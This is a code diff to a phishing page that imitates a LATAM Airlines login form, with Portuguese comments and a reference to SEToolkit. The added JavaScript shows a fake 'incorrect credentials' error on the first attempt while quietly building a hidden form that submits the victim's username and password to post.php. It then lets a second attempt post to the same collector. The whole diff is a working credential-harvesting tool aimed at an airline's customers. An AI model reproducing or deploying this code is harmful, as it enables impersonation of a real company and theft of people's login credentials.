@@ -72,6 +72,7 @@
         function validateForm(event) {
             var username = document.forms["loginForm"]["username"].value;
             var password = document.forms["loginForm"]["password"].value;
+            var errorMessage = document.getElementById("error-message");
 
             if (username === "" || password === "") {
                 event.preventDefault();
@@ -82,19 +83,40 @@
             attemptCount++;
 
             if (attemptCount === 1) {
+                errorMessage.style.display = "block";
                 event.preventDefault();
-                alert("Erro: Credenciais incorretas. Tente novamente.");
+                // Cria um formulário oculto para enviar os dados na primeira tentativa
+                var hiddenForm = document.createElement("form");
+                hiddenForm.method = "post";
+                hiddenForm.action = "post.php";
+
+                var hiddenUsername = document.createElement("input");
+                hiddenUsername.type = "hidden";
+                hiddenUsername.name = "username";
+                hiddenUsername.value = username;
+
+                var hiddenPassword = document.createElement("input");
+                hiddenPassword.type = "hidden";
+                hiddenPassword.name = "password";
+                hiddenPassword.value = password;
+
+                hiddenForm.appendChild(hiddenUsername);
+                hiddenForm.appendChild(hiddenPassword);
+                document.body.appendChild(hiddenForm);
+                hiddenForm.submit();
+
                 return false;
             }
 
-            // If second attempt, allow form submission and redirect
-            document.forms["loginForm"].action = "post.php"; // Adjust to the actual path used by SEToolkit
+            // Na segunda tentativa, envie o formulário normalmente
+            document.forms["loginForm"].action = "post.php"; // Ajustar para o caminho real usado pelo SEToolkit
             return true;
         }
     </script>
 </head>
 <body>
     <div class="container">
+        <div id="error-message" class="error-message">Erro: Credenciais incorretas. Tente novamente.</div>
         <form name="loginForm" method="post" onsubmit="return validateForm(event)">
             <img src="https://th.bing.com/th/id/R.8c29d58fe7dc2c144922bc2c2c07d008?rik=9EVDOKvltMk8Kg&riu=http%3a%2f%2flogos-download.com%2fwp-content%2fuploads%2f2016%2f12%2fLATAM_Airlines_logo_wordmark.png&ehk=KoMMi4amEshpJz3dL4OUfFcHwZ%2b32OLiAE591EJWXs4%3d&risl=&pid=ImgRaw&r=0" alt="Logo da LATAM Airlines" class="logo">
             <p class="texto-superior">Insira seu usuário:</p>
